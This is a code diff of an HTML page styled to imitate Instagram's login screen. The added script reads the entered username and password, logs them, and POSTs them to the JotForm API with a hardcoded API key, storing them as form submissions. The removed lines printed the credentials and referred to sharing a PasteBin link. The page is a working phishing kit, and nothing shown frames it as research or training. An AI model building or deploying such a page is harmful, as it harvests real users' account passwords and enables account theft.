@@ -5,7 +5,99 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram Login</title>
   <style>
-    /* Your existing CSS styles */
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-wrap: wrap;
+    }
+
+    .login-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 10px 0;
+      width: 350px;
+      text-align: center;
+      margin-right: 20px;
+      margin-bottom: 20px;
+    }
+
+    .login-box img {
+      width: 175px;
+      margin-top: 20px;
+      margin-bottom: 20px;
+    }
+
+    .login-box form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .login-box input {
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 12px;
+      padding: 9px 8px 7px;
+      margin-bottom: 6px;
+      width: 268px;
+    }
+
+    .login-box button {
+      background-color: #4db5f9;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 14px;
+      font-weight: bold;
+      padding: 5px 9px;
+      width: 268px;
+      margin-top: 10px;
+    }
+
+    .video-container {
+      width: 400px;
+      height: 700px;
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .video-container video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+      }
+
+      .login-box {
+        margin-right: 0;
+      }
+
+      .video-container {
+        width: 100%;
+        height: 300px;
+      }
+
+      .video-container video {
+        width: 100%;
+        height: auto;
+      }
+    }
   </style>
 </head>
 <body>
@@ -36,12 +128,33 @@
       const username = usernameInput.value;
       const password = passwordInput.value;
 
-      // Display the username and password
       console.log('Username:', username);
       console.log('Password:', password);
 
-      // You can now share the PasteBin URL with others
-      console.log('PasteBin URL: https://pastebin.com/UIFdu235s');
+      const apiKey = '344207c0b1a22012c227d925f13e8407';
+      const formId = '241464072748056';
+
+      // Construct the API request payload
+      const payload = new URLSearchParams({
+        'submission[3]': username, // Replace 3 with the actual field ID for username in your JotForm
+        'submission[4]': password, // Replace 4 with the actual field ID for password in your JotForm
+      });
+
+      // Send the API request to JotForm
+      fetch(`https://api.jotform.com/submission?apiKey=${apiKey}`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: payload
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Credentials stored in JotForm:', data);
+      })
+      .catch(error => {
+        console.error('Error storing credentials in JotForm:', error);
+      });
     });
   </script>
 </body>
